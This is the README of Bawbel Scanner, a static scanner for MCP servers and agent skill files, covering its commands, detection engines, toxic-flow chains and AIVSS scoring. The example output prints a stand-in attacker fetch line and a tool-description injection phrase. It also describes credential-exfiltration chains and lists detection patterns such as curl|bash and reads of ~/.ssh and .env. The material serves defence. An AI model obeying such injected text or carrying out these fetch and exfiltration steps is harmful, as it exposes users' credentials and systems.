<div align="center">

# Bawbel Scanner

<!-- mcp-name: io.github.bawbel/scanner -->

**Static security scanner for MCP servers and agent skill files, with an OWASP AIVSS score on every finding. Never starts your MCP servers, and runs no scanned content unless you enable the optional Docker sandbox.**


[![PyPI version](https://badge.fury.io/py/bawbel-scanner.svg)](https://pypi.org/project/bawbel-scanner/)
[![PyPI downloads](https://img.shields.io/pypi/dm/bawbel-scanner?label=downloads%2Fmonth&color=blue)](https://pepy.tech/project/bawbel-scanner)
[![Pepy total downloads](https://img.shields.io/pepy/dt/bawbel-scanner?label=total%20downloads&color=blue)](https://pepy.tech/project/bawbel-scanner)
[![License](https://img.shields.io/badge/license-Apache%202.0-blue.svg)](LICENSE)
[![Python](https://img.shields.io/badge/python-3.10%2B-blue.svg)](https://pypi.org/project/bawbel-scanner/)
[![AIVSS aligned](https://img.shields.io/badge/AIVSS-v0.8-teal.svg)](https://aivss.owasp.org)
<!-- Record counts are measured from the live AVE corpus, last on 2026-10-11.
     Source: https://raw.githubusercontent.com/aveproject/ave/main/dist/ave-records-latest.json
     They are still hand-edited: re-run the commands in bawbel/scanner#79 before
     changing any count. Regeneration tooling is tracked there too. -->
[![AVE Records](https://img.shields.io/badge/AVE_Records-87-green.svg)](https://aveproject.org)
[![MCP Registry](https://img.shields.io/badge/MCP_Registry-listed-purple.svg)](https://registry.modelcontextprotocol.io)

<!-- [![Star History Chart](https://api.star-history.com/svg?repos=bawbel/scanner&type=Date)](https://star-history.com/#bawbel/scanner&Date) -->

</div>

---

> **Bawbel never executes your MCP servers.**

```bash
pip install "bawbel-scanner[all]"
bawbel scan ./skills/        # scan skill files
bawbel ssc https://server    # scan MCP server without starting it
```

<img src="https://raw.githubusercontent.com/bawbel/scanner/HEAD/docs/demo.svg" width="100%" alt="Bawbel Scanner demo">

---

## Commands

| Command | Description |
|---|---|
| `bawbel scan <path>` | Scan a skill file or directory for AVE vulnerabilities. Supports `--recursive`, `--format text\|json\|sarif`, `--fail-on-severity`, `--no-ignore`, `--watch` |
| `bawbel report <path>` | Scan a component and show a full remediation guide with fix guidance per finding |
| `bawbel creds <path>` | Focused scan: hardcoded credentials and secret exposure only |
| `bawbel chain <path>` | Focused scan: unsafe agent delegation chains only |
| `bawbel ssc <url>` | Fetch and scan an MCP server-card for AVE vulnerabilities without starting the server |
| `bawbel scan-server-card <url>` | Alias for `ssc` |
| `bawbel conform <target>` | Score an MCP server manifest against the MCP specification (A+ to F grade) |
| `bawbel scan-conformance <target>` | Alias for `conform` |
| `bawbel accept <id> <file>` | Mark a finding as a false positive or accepted risk: inserts a justified suppression comment with reviewer and optional expiry |
| `bawbel pin <path>` | Hash skill files and save to `.bawbel-pins.json` for rug pull detection |
| `bawbel check-pins <path>` | Check skill files for drift against `.bawbel-pins.json` |
| `bawbel cp <path>` | Alias for `check-pins` |
| `bawbel init` | Initialise Bawbel Scanner in a project: generates `.bawbelignore` and `bawbel.yml` |
| `bawbel version` | Show version and detection engine status |

---

## Why Bawbel

| | Bawbel | NVIDIA SkillSpector | Snyk agent-scan | Cisco DefenseClaw |
|---|---|---|---|---|
| Starts MCP servers during a scan | Never | Never | Yes (stdio servers) | ? |
| Runs scanned skill content | Only in the optional Docker sandbox stage, off by default | Never | ? | ? |
| Open vulnerability database | Yes (AVE, 87 records, public API) | No (internal rule IDs) | No (internal rule IDs) | ? |
| OWASP AIVSS v0.8 scores | Yes | No (custom 0-100 risk score) | No | ? |
| Compound attack chain detection | Yes (12 AVE capability chains) | Yes (TT1-TT5 taint flows + AST8 chain) | Yes (chain count not published) | ? |
| MCP spec conformance grading (A+ to F) | Yes | No | No | ? |
| Git-committed pin / rug pull detection | Yes | No | No | ? |
| Suppression with expiry and audit trail | Yes (reason, reviewer, expiry) | Baseline (glob and fingerprint, no expiry) | Baseline (ignore flags, no expiry) | ? |
| Per-scan LLM usage and cost telemetry | No (tracked in [#79](https://github.com/bawbel/scanner/issues/79)) | Yes (`metadata.inference_usage`) | No | ? |
| SARIF 2.1.0 output | Yes | Yes | No | ? |
| License | Apache 2.0 | Apache 2.0 | Apache 2.0 | Apache 2.0 |

`?` means not verifiable from each project's public README at the time of writing
(2026-09-12). Sources for every other cell are listed in the PR description.

---

## How it works

### System overview

How a scan flows from your file to an AIVSS-scored finding:

```
  your file
      |
      v
  [ Pre-processing ]
    code fence stripping
    negation context detection
      |
      v
  [ Stage 0: Magika ]
    ML content-type verification
    gates the text engines below if content type is dangerous
      |
      v
  [ Detection engines ]  (run in parallel)
    1a  Pattern    40 regex rules, stdlib only, always on
    1b  YARA       39 binary/behavioral rules
    1c  Semgrep    41 structural rules
    2   LLM        semantic analysis via LiteLLM
    3   Sandbox    Docker behavioral sandbox
      |
      v
  [ Deduplication ]
    merge by (ave_id, line)
    pattern > yara > semgrep > llm > sandbox priority
      |
      v
  [ Toxic flow analysis ]
    map findings to capability tags
    check all pairs against 12 chain definitions
      |
      v
  [ ScanResult ]
    findings[]          active findings, sorted by severity
    suppressed_findings[]
    accepted_findings[] new in v1.2.0
    toxic_flows[]
    risk_score          max(findings, toxic_flows)
    aivss_score         OWASP AIVSS v0.8
```

### Detection stages

Six engines run across the pipeline. Results merge before toxic flow analysis:

```
  Stage 0    Magika engine
             ML-based content-type verification, gates the engines below
             pip install "bawbel-scanner[all]"

  Stage 1a   Pattern engine
             40 regex rules, no deps, < 5ms
             always active

  Stage 1b   YARA engine
             39 rules, multi-condition matching
             pip install "bawbel-scanner[yara]"

  Stage 1c   Semgrep engine
             41 structural rules, multi-line context
             pip install "bawbel-scanner[semgrep]"

  Stage 2    LLM engine
             semantic analysis, catches synonym attacks
             pip install "bawbel-scanner[llm]" + API key

  Stage 3    Sandbox engine
             dynamic behavioral analysis in Docker
             BAWBEL_SANDBOX_ENABLED=true

             +-----------+
  All  ----> | dedup     | ----> findings[]
  results    | sort      |       sorted by severity
             +-----------+
                  |
                  v
             toxic flow
             analysis
```

---

## False positive reduction

Eight layers run automatically before a finding is reported:

```
  file content
      |
      v  FP-1  code fence stripping       ~60% reduction
      |         content inside ``` blanked before scan
      |
      v  FP-2  negation context           ~15% reduction
      |         "Bad example:", "Never do this:" suppresses
      |
      v  FP-3  confidence scoring         ~10% reduction
      |         docs/ examples/ paths reduce confidence
      |
      v  FP-4  LLM meta-analyzer          ~7% reduction
      |         medium-confidence findings reviewed by LLM
      |
      v  FP-5a inline bawbel-ignore       per line
      |         <!-- bawbel-ignore -->
      |
      v  FP-5b block suppression          per section
      |         <!-- bawbel-ignore-start/end -->
      |
      v  FP-5c .bawbelignore patterns     per file
      |         gitignore-style glob rules
      |
      v  FP-6  justified suppression      per finding
               requires reason + reviewer + optional expiry
               audit trail in accepted_findings[]
```

| Layer | Mechanism | FP reduction |
|---|---|---|
| FP-1 | Code fence stripping | ~60% |
| FP-2 | Preceding-line negation context | ~15% |
| FP-3 | Confidence scoring (path, line context) | ~10% |
| FP-4 | LLM meta-analyzer (optional) | ~7% |
| FP-5a | Inline `<!-- bawbel-ignore -->` | per-line |
| FP-5b | Block suppression | per-section |
| FP-5c | `.bawbelignore` patterns | per-file |
| FP-6 | Justified suppression with audit trail | per-finding |

Every active finding carries a `confidence` field (0.0–1.0) that starts from the
AVE-class baseline and is adjusted by FP-2 through FP-4 before appearing in output.
`confidence_band()` maps it to `"high"` / `"medium"` / `"low"` for human display.
See [Evidence Lifecycle](docs/guides/evidence-lifecycle.md) for the full pipeline.

See [Suppression Guide](docs/guides/suppression.md) for full details.

---

## Toxic flow detection

A single `fetch()` call is a finding. A `fetch()` that retrieves credentials and then
sends them to an external endpoint is an attack chain, and the two findings together
are far more dangerous than either alone.

Bawbel detects these compound sequences as **toxic flows**. After deduplication, every
finding is mapped to a capability tag. Bawbel then checks all pairs against 12 built-in
chain definitions and raises a `ToxicFlow` when a dangerous combination is found.

Other scanners detect compound attacks too. NVIDIA SkillSpector, for example, ships a
source-to-sink taint tracker (TT1-TT5) over its own AST, including a credential
exfiltration chain. Bawbel's approach differs in what it operates on and what it emits:
chains are composed from AVE capability tags rather than traced through an AST, so a
flow is detected across natural-language instructions and configuration, not only
executable code. Each flow carries a stable `flow_id`, its own AIVSS score, and the
AVE IDs of its contributing findings.

```
  skill.md findings:
    AVE-2026-00003  credential-read   (READ ~/.ssh/id_rsa)         AIVSS 6.8 MEDIUM
    AVE-2026-00026  data-exfil        (POST to external endpoint)  AIVSS 6.8 MEDIUM
          │                │
          └───── chain ────┘
                   │
                   ▼
  ToxicFlow: credential-exfiltration   AIVSS 9.8  CRITICAL
    confidence: 0.83  (min of contributing baselines)
```

The toxic flow AIVSS (9.8) is higher than either individual finding (6.8), because
the chain represents a complete, end-to-end exploit, not just a capability.

**12 built-in chains:**

| Flow | Capabilities required | AIVSS |
|---|---|---|
| Credential Exfiltration | credential-read + data-exfil | 9.8 |
| Remote Code Execution | code-exec + external-fetch | 9.7 |
| Supply Chain RCE | supply-chain + code-exec | 9.6 |
| Goal Override + Execution | goal-hijack + code-exec | 9.5 |
| Lateral Movement + Execution | lateral-movement + code-exec | 9.4 |
| Tool Poisoning + Exfiltration | tool-poison + data-exfil | 9.3 |
| Identity Spoof + Escalation | identity-spoof + privilege-escalation | 9.2 |
| Persistence + Exfiltration | persistence + data-exfil | 9.1 |
| Context Inject + Memory Write | context-inject + memory-write | 8.9 |
| Goal Override + Exfiltration | goal-hijack + data-exfil | 8.8 |
| Scope Expansion + Exfiltration | scope-expansion + data-exfil | 8.7 |
| Covert Channel + Persistence | covert-channel + persistence | 8.6 |

**Toxic flow in JSON output:**

```json
{
  "flow_id": "credential-exfiltration",
  "title": "Credential Exfiltration Chain",
  "severity": "CRITICAL",
  "aivss_score": 9.8,
  "confidence": 0.83,
  "ave_ids": ["AVE-2026-00003", "AVE-2026-00026"],
  "capabilities": ["credential-read", "data-exfil"],
  "owasp_mcp": ["MCP06", "MCP07"],
  "remediation": "Remove credential access. Block egress to untrusted endpoints."
}
```

`confidence` is `min(baseline confidence)` across the contributing findings: the weakest
link in the chain. A chain is only as confident as its least certain component.

Adding a new flow requires one entry in `scanner/core/toxic_flows/flows.py`. No other
files need to change.

---

## Install

**pip**

```bash
pip install bawbel-scanner            # core - pattern engine only
pip install "bawbel-scanner[yara]"    # + YARA rules
pip install "bawbel-scanner[semgrep]" # + Semgrep rules
pip install "bawbel-scanner[llm]"     # + LLM semantic engine
pip install "bawbel-scanner[all]"     # everything
```

Requires Python 3.10+. No other system dependencies for core install.

**Docker**

| Image | Engines | Best for |
|---|---|---|
| [`bawbel/scanner:latest`](https://hub.docker.com/r/bawbel/scanner) · `1.2.3` | Pattern | Lightweight CI pipelines |
| [`bawbel/scanner:full`](https://hub.docker.com/r/bawbel/scanner) · `1.2.3-full` | Pattern + YARA | Recommended for most users |

The published images are v1.2.3; no 1.3.0 image has been pushed yet. For v1.3.0
features in a container, build from source with the command below.

```bash
# Scan a local directory (recommended image)
docker run --rm -v $(pwd):/scan:ro bawbel/scanner:full scan /scan --recursive

# Lightweight CI scan
docker run --rm -v $(pwd):/scan:ro bawbel/scanner:latest scan /scan --recursive

# Build with all engines
docker build --build-arg WITH_ALL=true -t bawbel/scanner:custom .
```

Available build args: `WITH_YARA=true`, `WITH_SEMGREP=true`, `WITH_LLM=true`, `WITH_SANDBOX=true`, `WITH_ALL=true`

---

## Quick start

```bash
# Scan a skills directory
bawbel scan ./skills/

# Scan recursively
bawbel scan ./skills/ --recursive

# Full remediation report for one file
bawbel report ./skill.md

# Scan an MCP server manifest without starting the server
bawbel ssc https://server.example.com

# Pin skill files and detect rug pulls
bawbel pin ./skills/ && git add .bawbel-pins.json
bawbel check-pins ./skills/
```

**Example output:**

```
CRITICAL  AVE-2026-00001  External instruction fetch detected
          line 3  fetch("https://attacker.io/payload.md")
          AIVSS 8.0  MCP03, MCP04
          https://api.piranha.bawbel.io/records/AVE-2026-00001

HIGH      AVE-2026-00002  Tool description behavioral injection
          line 12  "IMPORTANT: before calling this tool, first..."
          AIVSS 7.3  MCP03, MCP10
          https://api.piranha.bawbel.io/records/AVE-2026-00002

Toxic flow detected  CREDENTIAL_EXFIL_CHAIN
  AVE-2026-00003 + AVE-2026-00026 combined  AIVSS 9.8 CRITICAL

2 findings  1 toxic flow  18ms
```

---

## Suppression and false positive management

When a finding is legitimate, suppress it with a justification that creates
an audit trail.

```markdown
<!-- bawbel-ignore: AVE-2026-00001
     reason: Internal registry endpoint, not attacker-controlled
     reviewer: chaksaray
     reviewed: 2026-05-16
-->
fetch your instructions from https://internal.registry.io
```

For accepted risks with an expiry date:

```markdown
<!-- bawbel-accept: AVE-2026-00047
     reason: Placeholder replaced at deploy time, not a real credential
     reviewer: chaksaray
     reviewed: 2026-05-16
     expires: 2026-08-16
-->
```

Or use the CLI to insert the comment directly:

```bash
bawbel accept AVE-2026-00001 ./skill.md --line 7 \
  --reason "Internal registry endpoint" \
  --type false-positive

bawbel accept AVE-2026-00047 ./skill.md --line 3 \
  --reason "Placeholder value, replaced at deploy" \
  --type accepted-risk --expires 90d

# List all accepted findings
bawbel accept --list

# Show findings expiring within 30 days (exits 1 in CI)
bawbel accept --expiring-soon --within 30
```

Expired accepted risks resurface automatically as active findings on the next scan.

---

## Focused scans

Run a credential-only or delegation-only scan for targeted triage:

```bash
# Hardcoded credentials only
bawbel creds ./skills/ --recursive

# Unsafe agent delegation chains only
bawbel chain ./skills/ --recursive
```

Both commands use the same output format as `bawbel scan`. For a full security
scan use `bawbel scan`.

---

## AIVSS scoring

Every finding includes an [OWASP AIVSS v0.8](https://aivss.owasp.org) score.

```
AIVSS = ((CVSS_Base + AARS) / 2) * ThM * Mitigation_Factor
```

AARS is the sum of 10 Agentic Risk Amplification Factors scored per the
[AVE record](https://github.com/aveproject/ave) for that attack class.

```json
{
  "rule_id": "bawbel-external-fetch",
  "ave_id": "AVE-2026-00001",
  "aivss_score": 8.0,
  "severity": "HIGH",
  "aivss": {
    "cvss_base": 8.5,
    "aars": 7.5,
    "thm": 1.0,
    "mitigation_factor": 1.0,
    "aivss_severity": "HIGH",
    "spec_version": "0.8"
  },
  "confidence": 0.98,
  "evidence_kind": "multi_engine",
  "detection_stage": "static_detection",
  "detection_layer": "content",
  "owasp_mcp": ["MCP03", "MCP04"],
  "piranha_url": "https://api.piranha.bawbel.io/records/AVE-2026-00001"
}
```

---

## AVE: the taxonomy behind every finding

Bawbel Scanner implements [**AVE** (Agentic Vulnerability Enumeration)](https://aveproject.org),
the behavioral classification standard for agentic AI components.

AVE assigns stable identifiers to distinct attack classes, each with an AIVSS score,
a behavioral fingerprint, OWASP MCP Top 10 and MITRE ATLAS mappings, and indicators of
compromise. Every finding Bawbel produces maps to an AVE ID so teams using different
scanners speak the same language.

```
AVE-2026-00001  Metamorphic Payload via External Config Fetch   AIVSS 8.0  HIGH
AVE-2026-00002  Tool Poisoning via Description Manipulation     AIVSS 7.3  HIGH
AVE-2026-00046  MCP Tool Hook Hijacking                         AIVSS 9.2  CRITICAL
... 87 records published total
```

| | |
|---|---|
| Records published | 87 (AVE-2026-00001 to AVE-2026-00087) |
| Records with a detection rule in this scanner | 43 (42 by pattern, YARA, or Semgrep rules; AVE-2026-00024 by Magika) |
| Records with scanner metadata only, no rule | 8 (AVE-2026-00041 to 00045, 00049 to 00051) |
| Schema | 1.1.0, validates at [aveproject.org/schema.html](https://aveproject.org/schema.html) |
| AIVSS | v0.8, every record scored |
| Crosswalks | OWASP MCP Top 10, MITRE ATLAS, NIST AI RMF, OWASP AST10 |

44 of the 87 published records have no detection rule in this scanner. 27 of them are
`static_detection` records that a rule could catch and are the scanner's backlog. The
other 17 are runtime-stage records (15 `runtime_observed`, 2 `runtime_drift_detected`):
they describe behavior that only shows up while an agent runs, so static analysis of a
file cannot detect them by design. The record-by-record list, and the commands that
produce every count in this section, are in
[bawbel/scanner#79](https://github.com/bawbel/scanner/issues/79).

Any scanner can emit AVE IDs. See [aveproject.org](https://aveproject.org) for the
implementer guide and record index.

---

## Detection engines

| Engine | What it does | Install |
|---|---|---|
| Pattern | 40 regex rules mapped to AVE records | Always on |
| YARA | 39 binary and behavioral YARA rules | `[yara]` |
| Semgrep | 41 structural Semgrep rules | `[semgrep]` |
| LLM | Semantic analysis of intent and context | `[llm]` |
| Magika | ML-based content type verification | `[all]` |
| Sandbox | Dynamic behavioral analysis in Docker | See below |

---

## Stage 3: Behavioral sandbox

The sandbox runs your skill file inside an isolated Docker container and watches for malicious behavior at runtime: outbound connections, credential reads, shell injections, and filesystem writes that static rules cannot catch.

**Image:** [hub.docker.com/r/bawbel/sandbox](https://hub.docker.com/r/bawbel/sandbox) · `bawbel/sandbox:latest` · `bawbel/sandbox:1.2.3`

**Requirements:** Docker Desktop or Docker Engine must be running.

### Enable the sandbox

```bash
BAWBEL_SANDBOX_ENABLED=true bawbel scan ./skill.md
```

Or add to your `.env` / `bawbel.yml`:

```yaml
# bawbel.yml
sandbox:
  enabled: true
```

### Image setup (three modes)

| `BAWBEL_SANDBOX_IMAGE` | What happens |
|---|---|
| `default` *(recommended)* | Checks local Docker cache first. If not found, pulls [`bawbel/sandbox:latest`](https://hub.docker.com/r/bawbel/sandbox) from Docker Hub once and caches it. Subsequent scans use the cache; no network needed. |
| `local` | Skips Docker Hub entirely. Builds the sandbox image from the bundled Dockerfile inside the package. Use this for air-gapped or offline environments. |
| `<custom-image>` | Uses your own image. Point to any registry: `registry.company.com/bawbel/sandbox@sha256:abc123` |

**First run with `default`:** Bawbel pulls `bawbel/sandbox:latest` from Docker Hub automatically (~200MB, one time only). Every scan after that uses the local cache: instant, no network call.

**First run with `local`:** Bawbel builds the image from the bundled Dockerfile. Takes ~60 seconds on first run, cached afterwards.

```bash
# Recommended: default (auto-pull, cached)
BAWBEL_SANDBOX_ENABLED=true bawbel scan ./skill.md

# Offline / air-gapped: build locally
BAWBEL_SANDBOX_ENABLED=true BAWBEL_SANDBOX_IMAGE=local bawbel scan ./skill.md

# Custom enterprise image
BAWBEL_SANDBOX_ENABLED=true \
  BAWBEL_SANDBOX_IMAGE=registry.company.com/bawbel/sandbox:v1 \
  bawbel scan ./skill.md
```

### What the sandbox detects

| Category | Examples |
|---|---|
| Network egress | Connections to pastebin.com, rentry.co, ngrok tunnels, webhook capture sites |
| Credential access | Reads of `~/.ssh/`, `.env`, private key files |
| Filesystem writes | Writes to `~/.bashrc`, `~/.zshrc`, cron directories |
| Process injection | `curl\|bash`, `wget\|bash`, `eval()`, `exec()`, unexpected `pip install` |

---

## CI/CD

```yaml
# .github/workflows/security.yml
# The SARIF upload needs: permissions: security-events: write
- name: Bawbel scan
  id: bawbel
  uses: bawbel/integrations@v1
  with:
    path: ./skills/
    fail-on-severity: high
    format: sarif

- name: Upload to GitHub Security
  if: always()
  uses: github/codeql-action/upload-sarif@v3
  with:
    sarif_file: ${{ steps.bawbel.outputs.sarif-file }}
```

The action is maintained in [bawbel/integrations](https://github.com/bawbel/integrations).
It writes the SARIF file itself and exposes its path as the `sarif-file` output.

Pre-commit (scans staged `.md`, `.json`, `.yaml`, `.yml`, and `.txt` files):

```yaml
# .pre-commit-config.yaml
repos:
  - repo: local
    hooks:
      - id: bawbel-scan
        name: bawbel scan
        entry: python -m scanner.bawbel_pre_commit --fail-on-severity high
        language: python
        additional_dependencies: ["bawbel-scanner==1.3.0"]
        files: \.(md|json|ya?ml|txt)$
```

---

## Output formats

```bash
bawbel scan ./skills/ --format text    # human-readable (default)
bawbel scan ./skills/ --format json    # machine-readable
bawbel scan ./skills/ --format sarif   # GitHub Security / GHAS
```

---

## Related

| | |
|---|---|
| [aveproject.org](https://aveproject.org) | AVE: Agentic Vulnerability Enumeration standard (87 records, schema, crosswalks) |
| [api.aveproject.org](https://api.aveproject.org) | AVE records API, one JSON record per ID |
| [aivss.owasp.org](https://aivss.owasp.org) | OWASP AIVSS v0.8 scoring standard |
| [bawbel.io/docs](https://bawbel.io/docs) | Full documentation |

---

## Contributing

See [CONTRIBUTING.md](CONTRIBUTING.md). The most impactful contribution is a
new detection rule tied to an [AVE record](https://github.com/aveproject/ave). The
[coverage gap](https://github.com/bawbel/scanner/issues/79) lists the published
records with no rule yet.

```bash
git clone https://github.com/bawbel/scanner
cd scanner
pip install -e ".[dev,all]"
pre-commit install
python -m pytest tests/ -v
```

---

<div align="center">

Apache License 2.0 - Free forever - Maintained by [Bawbel](https://bawbel.io)

[bawbel.io](https://bawbel.io) . [@bawbel_io](https://twitter.com/bawbel_io) . [bawbel.io/docs](https://bawbel.io/docs)

</div>
